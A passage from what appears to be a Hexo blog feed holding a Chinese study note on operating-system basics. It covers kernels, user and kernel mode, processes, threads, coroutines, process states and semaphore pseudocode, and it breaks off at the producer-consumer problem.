class="string">&#x27;Dawn&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>从库中查询</p>
]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2021/08/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="1-操作系统的基本概念"><a href="#1-操作系统的基本概念" class="headerlink" title="1.操作系统的基本概念"></a>1.操作系统的基本概念</h1><ol>
<li>操作系统的基本概念</li>
<li><strong>操作系统（Operating System，简称 OS）是管理计算机硬件与软件资源的程序，是计算机的基石。</strong></li>
<li><strong>操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源。</strong> 举例：运行在你电脑上的所有应用程序都通过操作系统来调用系统内存以及磁盘等等硬件。</li>
<li><strong>操作系统存在屏蔽了硬件层的复杂性。</strong> 操作系统就像是硬件使用的负责人，统筹着各种相关事项。</li>
<li><strong>操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理</strong>。 内核是连接应用程序和硬件的桥梁，决定着系统的性能和稳定性。</li>
</ol>
<a id="more"></a>

<h2 id="操作系统的内核（Kernel）"><a href="#操作系统的内核（Kernel）" class="headerlink" title="操作系统的内核（Kernel）"></a>操作系统的内核（Kernel）</h2><p>维基百科对于内核的解释：</p>
<blockquote>
<p><strong>内核</strong>（英语：Kernel，又称核心）在计算机科学中是一个用来管理软件发出的数据 I/O（输入与输出）要求的电脑程序，将这些要求转译为数据处理的指令并交由中央处理器（CPU）及电脑中其他电子组件进行处理，是现代操作系统中最基本的部分。它是为众多应用程序提供对计算机硬件的安全访问的一部分软件，这种访问是有限的，并由内核决定一个程序在什么时候对某部分硬件操作多长时间。 <strong>直接对硬件操作是非常复杂的。所以内核通常提供一种硬件抽象的方法，来完成这些操作。有了这个，通过进程间通信机制及系统调用，应用进程可间接控制所需的硬件资源（特别是处理器及 IO 设备）。</strong></p>
<p>早期计算机系统的设计中，还没有操作系统的内核这个概念。随着计算机系统的发展，操作系统内核的概念才渐渐明晰起来了!</p>
</blockquote>
<p>简单概括两点：</p>
<ol>
<li><strong>操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。</strong></li>
<li><strong>操作系统的内核是连接应用程序和硬件的桥梁，决定着操作系统的性能和稳定性。</strong></li>
</ol>
<h2 id="中央处理器（CPU，Central-Processing-Unit）"><a href="#中央处理器（CPU，Central-Processing-Unit）" class="headerlink" title="中央处理器（CPU，Central Processing Unit）"></a>中央处理器（CPU，Central Processing Unit）</h2><p>关于 CPU 简单概括三点：</p>
<ol>
<li><strong>CPU 是一台计算机的运算核心（Core）+控制核心（ Control Unit），可以称得上是计算机的大脑。</strong></li>
<li><strong>CPU 主要包括两个部分：控制器+运算器。</strong></li>
<li><strong>CPU 的根本任务就是执行指令，对计算机来说最终都是一串由“0”和“1”组成的序列。</strong></li>
</ol>
<h2 id="CPU-vs-Kernel-内核"><a href="#CPU-vs-Kernel-内核" class="headerlink" title="CPU vs Kernel(内核)"></a>CPU vs Kernel(内核)</h2><p>可以简单从下面两点来区别：</p>
<ol>
<li>操作系统的内核（Kernel）属于操作系统层面，而 CPU 属于硬件。</li>
<li>CPU 主要提供运算，处理各种指令的能力。内核（Kernel）主要负责系统管理比如内存管理，它屏蔽了对硬件的操作。</li>
</ol>
<p><a href="http://qiniu.xiaoming.net.cn/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5.png"><img src="http://qiniu.xiaoming.net.cn/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5.png" alt="操作系统的基本概念"></a></p>
<h1 id="2-操作系统的基本特性"><a href="#2-操作系统的基本特性" class="headerlink" title="2. 操作系统的基本特性"></a>2. 操作系统的基本特性</h1><p>操作系统的基本特性是<strong>并发性</strong>、<strong>共享性</strong>、<strong>虚拟性</strong>、<strong>异步性</strong>。</p>
<h2 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h2><p>并行性和并发性(Concurrence)是既相似又有区别的两个概念，并行性是指两个或多个事件<strong>在同一时刻发生</strong>；而并发性是指两个或多个事件<strong>在同一时间间隔内发生</strong>。在多道程序环境下，并发性是指在一段时间内宏观上有多个程序在同时运行，但在单处理机系统中，每一时刻却仅能有一道程序执行，故微观上这些程序只能是分时地交替执行。（宏观并发微观串行）</p>
<p>并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统</p>
<p>操作系统通过引入进程和线程，使得程序能够并发运行。</p>
<h2 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h2><p>指系统中的资源可供内存中多个并发执行的进程(线程)共同使用，相应地，把这种资源共同使用称为资源共享，或称为资源复用。目前主要实现资源共享的方式有：</p>
<ul>
<li>互斥共享方式</li>
<li>同时访问方式</li>
</ul>
<h3 id="互斥共享方式"><a href="#互斥共享方式" class="headerlink" title="互斥共享方式"></a>互斥共享方式</h3><p>当一个进程 A 要访问某资源时，必须先提出请求。如果此时该资源空闲，系统便可将之分配给请求进程 A 使用。此后若再有其它进程也要访问该资源时(只要 A 未用完)，则必须等待。仅当 A 进程访问完并释放该资源后，才允许另一进程对该资源进行访问。我们把这种资源共享方式称为互斥式共享，而把在一段时间内只允许一个进程访问的资源称为临界资源或独占资源，例如打印机。</p>
<h3 id="同时访问方式"><a href="#同时访问方式" class="headerlink" title="同时访问方式"></a>同时访问方式</h3><p>系统中还有另一类资源，允许在一段时间内由多个进程“同时”对它们进行访问。这里所谓的“同时”，在单处理机环境下往往是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问。典型的可供多个进程“同时”访问的资源是磁盘设备，一些用重入码编写的文件也可以被“同时”共享，即若干个用户同时访问该文件。</p>
<h2 id="虚拟性"><a href="#虚拟性" class="headerlink" title="虚拟性"></a>虚拟性</h2><p>虚拟技术把一个物理实体转换为多个逻辑实体。</p>
<p>主要有两种虚拟技术：时（时间）分复用技术和空（空间）分复用技术。</p>
<p>多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换。</p>
<p>虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。</p>
<h2 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h2><p>在多道程序环境下允许多个进程并发执行，但只有进程在获得所需的资源后方能执行。在单处理机环境下，由于系统中只有一台处理机，因而每次只允许一个进程执行，其余进程只能等待。进程是以人们不可预知的速度向前推进，此即进程的异步性。</p>
<h1 id="3-操作系统的基本功能"><a href="#3-操作系统的基本功能" class="headerlink" title="3. 操作系统的基本功能"></a>3. 操作系统的基本功能</h1><p>操作系统的基本功能包括<strong>进程管理</strong>、<strong>内存管理</strong>、<strong>文件管理</strong>、<strong>设备管理</strong>。</p>
<ul>
<li>进程管理：进程控制、进程同步、进程通信、死锁处理、处理机调度等</li>
<li>内存管理：内存分配、地址映射、内存保护与共享、虚拟内存等</li>
<li>文件管理：文件存储空间的管理、目录管理、文件读写管理和保护等</li>
<li>设备管理：完成用户I/O请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓冲管理、设备管理、设备处理、虚拟设备等。</li>
</ul>
<h1 id="4-什么是系统调用-用户态和系统态是？"><a href="#4-什么是系统调用-用户态和系统态是？" class="headerlink" title="4. 什么是系统调用/用户态和系统态是？"></a>4. 什么是系统调用/用户态和系统态是？</h1><p>根据进程访问资源的特点，可以把进程在系统上的运行分为两个级别：</p>
<ul>
<li>用户态(user mode) : 用户态运行的进程或程序可以直接读取用户程序的数据。</li>
<li>系统态(kernel mode):可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。</li>
</ul>
<p>我们运行的程序基本都是运行在用户态，如果要调用操作系统提供的系统态级别的子功能，那就需要系统调用了！</p>
<p>也就是说在运行的用户程序中，凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。</p>
<p>这些系统调用按功能大致可分为如下几类：</p>
<ul>
<li>设备管理。完成设备的请求或释放，以及设备启动等功能。</li>
<li>文件管理。完成文件的读、写、创建及删除等功能。</li>
<li>进程控制。完成进程的创建、撤销、阻塞及唤醒等功能。</li>
<li>进程通信。完成进程之间的消息传递或信号传递等功能。</li>
<li>内存管理。完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<p><a href="http://qiniu.xiaoming.net.cn/%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E3%80%81%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%81%E5%86%85%E6%A0%B8%E5%92%8C%E7%A1%AC%E4%BB%B6%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpeg"><img src="http://qiniu.xiaoming.net.cn/%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E3%80%81%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%81%E5%86%85%E6%A0%B8%E5%92%8C%E7%A1%AC%E4%BB%B6%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpeg" alt="用户程序、系统调用、内核和硬件之间的关系"></a></p>
<h2 id="为什么要有用户态与内核态"><a href="#为什么要有用户态与内核态" class="headerlink" title="为什么要有用户态与内核态?"></a>为什么要有用户态与内核态?</h2><p>在 cpu 的所有指令中，有些指令是非常危险的，如果使用不当，将会造成系统崩溃等后果。为了避免这种情况发生，cpu 将指令划分为<strong>特权级(内核态)指令</strong>和<strong>非特权级(用户态)指令。</strong></p>
<p><strong>对于那些危险的指令只允许内核及其相关模块调用，对于那些不会造成危险的指令，就允许用户应用程序调用。</strong></p>
<ul>
<li>内核态(核心态,特权态): <strong>内核态是操作系统内核运行的模式。</strong> 内核态控制计算机的硬件资源，如硬件设备，文件系统等等，并为上层应用程序提供执行环境。</li>
<li>用户态: <strong>用户态是用户应用程序运行的状态。</strong> 应用程序必须依托于内核态运行,因此用户态的操作权限比内核态是要低的，如磁盘，文件等，访问操作都是受限的。</li>
<li>系统调用: 系统调用是操作系统为应用程序提供能够访问到内核态的资源的接口。</li>
</ul>
<h2 id="用户态切换到内核态的几种方式"><a href="#用户态切换到内核态的几种方式" class="headerlink" title="用户态切换到内核态的几种方式"></a>用户态切换到内核态的几种方式</h2><ul>
<li>系统调用: 系统调用是用户态主动要求切换到内核态的一种方式，用户应用程序通过操作系统调用内核为上层应用程序开放的接口来执行程序。</li>
<li>异常: 当 cpu 在执行用户态的应用程序时，发生了某些不可知的异常。于是当前用户态的应用进程切换到处理此异常的内核的程序中去。</li>
<li>硬件设备的中断: 当硬件设备完成用户请求后，会向 cpu 发出相应的中断信号，这时 cpu 会暂停执行下一条即将要执行的指令，转而去执行与中断信号对应的应用程序，如果先前执行的指令是用户态下程序的指令，那么这个转换过程也是用户态到内核台的转换。</li>
</ul>
<h1 id="5-程序、进程与线程和协程"><a href="#5-程序、进程与线程和协程" class="headerlink" title="5. 程序、进程与线程和协程"></a>5. 程序、进程与线程和协程</h1><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>程序是含有指令和数据的文件，被存在磁盘或其他的数据存储设备中，也就是说程序是静态的代码。</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>为使程序能并发执行，且为了对并发执行的程序加以描述和控制，人们引入了“进程”的概念。进程是<strong>进程实体</strong>的运行过程，是系统进行资源分配和调度的一个独立单位。</p>
<p>进程是程序的一次执行过程，是系统运行程序的基本单位，因此进程是动态的。系统运行一个程序即是一个进程从创建，运行到消亡的过程。简单来说，一个进程就是一个执行中的程序，它在计算机中一个指令接着一个指令地执行着，同时，<strong>每个进程还占有某些系统资源如 CPU 时间，内存空间，文件，输入输出设备的使用权等等</strong>。换句话说，当程序在执行时，将会被操作系统载入内存中。</p>
<p><strong>结构特征</strong>：通常程序是不能并发执行的。为使程序(含数据)能独立运行，应为之配置一进程控制块，即<code>PCB</code>(Process Control Block)（动态特征的集中反映）；而由程序段（描述要完成的功能）、相关的数据段（操作对象及工作区）和 PCB 三部分便构成了<strong>进程实体</strong>。</p>
<blockquote>
<p>PCB一般在内存中，而程序段和数据段有可能是外存调入。所谓进程的创建和撤销，都是指对PCB的操作</p>
</blockquote>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>在操作系统中引入线程，是为了减少程序在并发执行时所付出的时空开销，使 OS 具有更好的并发性。适用于多CPU和网络操作系统。</p>
<p>线程与进程相似。但是线程是一个比进程更小的执行单位。<strong>一个进程在其执行的过程中可以产生多个线程。与线程不同的的是同类的多个线程共享同一块内存空间和一组系统资源</strong>（共享进程的堆和方法区资源），但是每个线程有自己的程序计数器、虚拟机栈和本地方法栈，所以系统在产生一个线程，或是在各个线程之间切换工作时，负担要比进程小。</p>
<p>线程是进程划分成的更小的运行单位。线程和进程最大的不同在于基本上各进程是独立的，而各线程则不一定，因为同一进程中的线程极有可能会相互影响。从另一角度来说，进程属于操作系统的范畴，主要是同一段时间内，可以同时执行一个以上的程序，而线程则是在同一程序内几乎同时执行一个以上的程序段。线程执行开销小，但不利于资源的管理和保护；而进程正相反。</p>
<p>进程是可拥有资源的独立单位和可独立调度和分派的基本单位，在创建、撤销消和切换中，系统必须为之付出较大的时空开销。</p>
<p>线程具有许多传统进程所具有的特征，所以又称为轻型进程(Light-Weight Process)或进程元，相应地把传统进程称为重型进程(Heavy-Weight Process)，传统进程相当于只有一个线程的任务。</p>
<h3 id="线程的属性"><a href="#线程的属性" class="headerlink" title="线程的属性"></a>线程的属性</h3><ul>
<li>轻型实体，线程中的实体基本上不拥有系统资源</li>
<li>独立调度和分派的基本单位，线程的切换非常迅速，开销小</li>
<li>可并发执行（指一个进程内可以有多个进程，一个进程的线程可以与其他进程内的线程并发）</li>
<li>线程可以共享进程资源</li>
</ul>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul>
<li>拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，可以访问隶属进程的资源</li>
<li>调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换。</li>
<li>系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。</li>
<li>通信方面：线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC</li>
</ul>
<p>在 Java 中，一个进程中可以有多个线程，多个线程共享进程的堆和方法区资源（JDK1.8之后使用元空间），但是每个线程有自己的程序计数器，虚拟机栈和本地方法栈。</p>
<p>堆和方法区是所有线程共享的资源，其中堆是进程中最大的一块内存，主要用于存放新创建的对象 (所有对象都在这里分配内存)，方法区主要用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</p>
<p>线程是进程划分成更小的运行单位。线程和进程最大的不同在于基本上各个进程都是独立的，而线程则不一定。同一进程中的不同线程极有可能相互影响。线程执行开销小，但不利于资源的管理和保护；进程则相反。</p>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>协程本质上<strong>是一种用户态的轻量级线程</strong>，协程的调度完全由用户控制。</p>
<p>传统意思上来说，线程分为内核态线程和用户态线程，用户态线程需要绑定内核态线程，CPU并不能感知用户态线程的存在，它只知道它在运行1个线程，这个线程实际是内核态线程。<strong>用户态线程实际有个名字就叫协程（co-routine）</strong>，为了容易区分，<strong>使用协程指用户态线程，使用线程指内核态线程</strong>。</p>
<p>协程跟线程是有区别的，线程由 CPU 调度是抢占式的，<strong>协程由用户态调度是协作式的</strong>，一个协程让出CPU后，才执行下一个协程。</p>
<p>协程和线程有3种映射关系：</p>
<ul>
<li>N:1，N个协程绑定1个线程，优点就是<strong>协程在用户态线程即完成切换，不会陷入到内核态，这种切换非常的轻量快速</strong>。但也有很大的缺点，1个进程的所有协程都绑定在1个线程上，一是某个程序用不了硬件的多核加速能力，二是一旦某协程阻塞，造成线程阻塞，本进程的其他协程都无法执行了，根本就没有并发的能力了。</li>
<li>1:1，1个协程绑定1个线程，这种最容易实现。协程的调度都由CPU完成了，不存在N:1缺点，但有一个缺点是协程的创建、删除和切换的代价都由CPU完成，有点略显昂贵了。</li>
<li>M:N，M个协程绑定1个线程，是N:1和1:1类型的结合，克服了以上2种模型的缺点，但实现起来最为复杂。</li>
</ul>
<p>协程是个好东西，不少语言支持了协程，比如：Lua、Erlang、Java（C++即将支持），就算语言不支持，也有库支持协程，比如C语言的coroutine（风云大牛作品）、Kotlin的kotlinx.coroutines、Python的gevent。</p>
<p>协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本<strong>没有内核切换的开销</strong>，可以不加锁的访问全局变量，所以上下文的切换非常快。</p>
<ul>
<li>协程是属于线程的。协程程序是在线程里面跑的，因此协程又称微线程和纤程等</li>
<li>协程没有线程的上下文切换消耗。协程的调度切换是用户(程序员)手动切换的，因此更加灵活,因此又叫用户空间线程.</li>
<li>原子操作性。由于协程是用户调度的，所以不会出现执行一半的代码片段被强制中断了，因此无需原子操作锁</li>
</ul>
<p>协程的优点：</p>
<ul>
<li>跨平台</li>
<li>跨体系架构</li>
<li>无需线程上下文切换的开销</li>
<li>无需原子操作锁定及同步的开销</li>
<li>方便切换控制流，简化编程模型</li>
<li>高并发+高扩展性+低成本：一个 CPU 支持上万的协程都不是问题。所以很适合用于高并发处理。</li>
</ul>
<p>缺点：</p>
<ul>
<li>无法利用多核资源：协程的本质是个单线程，它不能同时将单个 CPU 的多个核用上，协程需要和进程配合才能运行在多 CPU 上。当然我们日常所编写的绝大部分应用都没有这个必要，除非是 cpu 密集型应用。</li>
<li>进行阻塞（Blocking）操作（如IO时）会阻塞掉整个程序：这一点和事件驱动一样，可以使用异步IO操作来解决</li>
</ul>
<h1 id="6-进程状态的切换"><a href="#6-进程状态的切换" class="headerlink" title="6. 进程状态的切换"></a>6. 进程状态的切换</h1><h2 id="进程的三种基本状态"><a href="#进程的三种基本状态" class="headerlink" title="进程的三种基本状态"></a>进程的三种基本状态</h2><ul>
<li><strong>就绪状态</strong>：当进程已分配到除 CPU 以外的所有必要资源后，只要再获得 CPU，便可立即执行，进程这时的状态称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列。</li>
<li><strong>执行状态</strong>：进程已获得 CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态；在多处理机系统中，则有多个进程处于执行状态。</li>
<li><strong>阻塞状态</strong>：正在执行的进程由于发生某事件而暂时无法继续执行时，便放弃处理机而处于暂停状态，亦即进程的执行受到阻塞，把这种暂停状态称为阻塞状态，有时也称为等待状态或封锁状态。致使进程阻塞的典型事件有：请求 I/O，申请缓冲空间等。通常将这种处于阻塞状态的进程也排成一个队列。有的系统则根据阻塞原因的不同而把处于阻塞状态的进程排成多个队列。</li>
</ul>
<p><a href="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81%E5%88%87%E6%8D%A2.png"><img src="http://qiniu.xiaoming.net.cn/%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81%E5%88%87%E6%8D%A2.png" alt="进程状态切换"></a></p>
<ul>
<li>只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。</li>
<li>阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。</li>
</ul>
<h1 id="7-进程同步"><a href="#7-进程同步" class="headerlink" title="7. 进程同步"></a>7. 进程同步</h1><p>进程/线程同步是两个或多个共享关键资源的线程的并发执行。应该同步线程以避免关键的资源使用冲突。</p>
<h2 id="临界资源"><a href="#临界资源" class="headerlink" title="临界资源"></a>临界资源</h2><p>一次<strong>仅允许一个进程使用</strong>的共享资源，如打印机、磁带机、表格等</p>
<h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>在每个进程中访问临界资源的那段程序（指的是软件），进程必须互斥进入临界区。</p>
<p>为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查，看它是否正被访问。如果此刻该临界资源未被访问，进程便可进入临界区对该资源进行访问，并设置它正被访问的标志；如果此刻该临界资源正被某进程访问，则本进程不能进入临界区。因此，必须在临界区前面增加一段用于进行上述检查的代码，把这段代码称为<code>进入区(entry section)</code>。相应地，在临界区后面也要加上一段称为退出区<code>(exit section)</code>的代码，用于将临界区正被访问的标志恢复为未被访问的标志。进程中除上述进入区、临界区及退出区之外的其它部分的代码，在这里都称为<code>剩余区</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">repeat </span><br><span class="line">	   entry section  # 检查临界资源是否能访问</span><br><span class="line">	   critical section； </span><br><span class="line">	   exit section </span><br><span class="line">	   remainder section； # 把临界区标志设为未访问</span><br><span class="line">until <span class="literal">false</span>；</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="同步和互斥"><a href="#同步和互斥" class="headerlink" title="同步和互斥"></a>同步和互斥</h2><p>在多道程序环境下，当程序并发执行时，由于资源共享和进程合作，使同处于一个系统中的诸进程之间可能存在着以下两种形式的制约关系。</p>
<ul>
<li><p><strong>间接相互制约</strong>：同处于一个系统中的进程，通常都共享着某种系统资源，而形成的相互制约。这种关系又叫<strong>互斥关系</strong>。</p>
<blockquote>
<p>互斥是并发执行的多个进程由于竞争同一资源而产生的相互排斥的关系</p>
</blockquote>
</li>
<li><p><strong>直接相互制约</strong>：这种制约主要源于进程间的合作。这种关系又叫<strong>同步关系</strong></p>
<blockquote>
<p>同步是进程间共同完成一项任务时直接发生相互作用的关系</p>
</blockquote>
</li>
</ul>
<h2 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h2><p>信号量是一种数据结构，用于控制进程停止或执行。信号量的值表示相应资源的使用情况，它的值由P、V操作决定。</p>
<h3 id="整形信号量"><a href="#整形信号量" class="headerlink" title="整形信号量"></a>整形信号量</h3><p>整型信号量定义为一个用于表示资源数目的整型量<code>S</code>，它与一般整型量不同，除初始化外，仅能通过两个标准的原子操作(Atomic Operation) (原语）<code>wait(S)</code>和 <code>signal(S)</code> 来访问。很长时间以来，这两个操作一直被分别称为 <code>P、V</code>操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># Wait(S)原语：</span><br><span class="line">wait(S)： </span><br><span class="line">	<span class="keyword">while</span> S&lt;=<span class="number">0</span> <span class="keyword">do</span> no-op；</span><br><span class="line">	S:=S-<span class="number">1</span>；</span><br><span class="line"></span><br><span class="line"># Signal(S)原语：</span><br><span class="line">signal(S)： S:=S+<span class="number">1</span>；</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>wait(S)和 signal(S)是两个原子操作，因此，它们在执行时是不可中断的。亦即，当一个进程在修改某信号量时，没有其他进程可同时对该信号量进行修改。此外，在 wait 操作中，对 S 值的测试和做 S:=S-1 操作时都不可中断。</p>
</blockquote>
<ul>
<li>缺点：在整型信号量机制中的<code>wait</code>操作，只要是信号量<code>S≤0</code>，就会不断地测试。因此，该机制并未遵循“让权等待”的准则，而是使进程处于“忙等”的状态。</li>
</ul>
<h3 id="记录型信号量"><a href="#记录型信号量" class="headerlink" title="记录型信号量"></a>记录型信号量</h3><p>记录型信号量机制则是一种不存在“忙等”现象的进程同步机制。但在采取了“让权等待”的策略后，又会出现多个进程等待访问同一临界资源的情况。为此，在信号量机制中，除了需要一个用于代表资源数目的整型变量<code>value</code>外，还应增加一个进程链表指针 <code>L</code>，用于链接上述的所有等待进程。</p>
<p>记录型信号量采用了记录型的数据结构，包含两个数据项，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">	  int value;<span class="comment">//资源信号量，表示某类资源可用数目</span></span><br><span class="line">	  struct process_control_block *list; <span class="comment">//pcb链表，阻塞队列</span></span><br><span class="line">&#125;semaphore;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>S.value大于0时，表示资源的可用数目；S.value小于0时，代表等待使用资源的进程个数（阻塞的进程数量）</p>
</blockquote>
<p>此时wait(S)和signal(S)操作如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//申请一个单位资源</span></span><br><span class="line"><span class="function"><span class="title">wait</span>(<span class="params">semaphore *S</span>)</span>&#123;</span><br><span class="line">	  S-&gt;value--;</span><br><span class="line">	  <span class="keyword">if</span>(S-&gt;value&lt;<span class="number">0</span>) block(S-&gt;list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放一个单位资源</span></span><br><span class="line"><span class="function"><span class="title">signal</span>(<span class="params">semaphore *S</span>)</span>&#123;</span><br><span class="line">	  S-&gt;value++;</span><br><span class="line">	  <span class="keyword">if</span>(S-&gt;value&lt;=<span class="number">0</span>) wakeup(S-&gt;list); <span class="comment">//表示还有等待该资源的进程被阻塞，将阻塞的进程进入就绪状态</span></span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果 S.value 的初值为 1，表示只允许一个进程访问临界资源，此时的信号量转化为<strong>互斥信号量</strong>，用于进程互斥。</p>
</blockquote>
<ul>
<li>缺点：当一个进程需要获得两个或更多个共享资源后才能完成其任务，此时有两个进程A和B，都需要访问共享资源D和E（都设置了互斥信号量），其中A访问了D，B访问了E，此时A进入阻塞等待E，而B进入阻塞等待D，两者都还没有释放资源，又相互等待，就进入<strong>死锁</strong>状态</li>
</ul>
<h3 id="AND型信号量"><a href="#AND型信号量" class="headerlink" title="AND型信号量"></a>AND型信号量</h3><p>其基本思想是：将进程在整个运行过程中需要的所有资源，一次性全部地分配给进程，待进程使用完后再一起释放。只要尚有一个资源未能分配给进程，其它所有可能为之分配的资源也不分配给它。亦即，对若干个临界资源的分配，采取原子操作方式：要么把它所请求的资源全部分配到进程，要么一个也不分配。</p>
<p>因此，AND型信号量在<code>wait</code>操作中增加了一个“AND”条件，称为<code>AND同步</code>，或者称为<code>同时wait操作</code>，即<code>Swait</code>(Simultaneous wait)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Swait(S1,S2,...,Sn)</span><br><span class="line">&#123;</span><br><span class="line">	  <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">		  <span class="keyword">if</span>(Si&gt;<span class="number">1</span> &amp;&amp; ... &amp;&amp; Sn&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">			  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)Si--;</span><br><span class="line">			  <span class="keyword">break</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">		  <span class="keyword">else</span>&#123;</span><br><span class="line">			   <span class="comment">//将进程放在与Si&lt;1的第一个Si相关联的等待队列中，并将此进程的程序计数设置为Swait操作的开头</span></span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">Ssignal</span>(<span class="params">S1,S2,...,Sn</span>)</span>&#123;</span><br><span class="line">	  <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">		  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">			  Si++;</span><br><span class="line">			  <span class="comment">//将与Si关联的队列中等待的所有进程移动到就绪队列中</span></span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h3 id="使用信号量实现生产者——消费者问题"><a href="#使用信号量实现生产者——消费者问题" class="headerlink" title="使用信号量实现生产者——消费者问题"></a>使用信号量实现生产者——消费者问题</h3><p>生产者—消费者问题是相互合作的进程关系的一种抽象，例如，在输入时，输入进程是生产者，计算进程是消费者；而在输出时，计算进程是生产者，而打印进程是消费者。</p>
<p>一组生产者进程生产产品给一组消费者进程消费。为使它们并发执行，设一个有n个缓冲区的缓冲池，生产者一次向一个缓冲区中投入消息；消费者从一个缓冲区中取得消息。生产者-消费者问题实际上是相互合作进程关系的一种抽象。<br>制约关系：</p>
<ul>
<li>不允许消费者进程到一个空缓冲区中取产品</li>
<li>不允许生产者进程到一个已满且还没被取走的缓冲区中投放产品</li>
</ul>
<p>假定在生产者和消费者之间的公用缓冲池中，具有 n 个缓冲区，这时可利用互斥信号量<code>mutex</code>实现诸进程对缓冲池的互斥使用。利用信号量<code>empty</code>和<code>full</code>分别表示缓冲池中空缓冲区和满缓冲区的个数。又假定这些生产者和消费者相互等效，只要缓冲池未满，生产者便可将消息送入缓冲池；只要缓冲池未空，消费者便可从缓冲池中取走一个消息。</p>
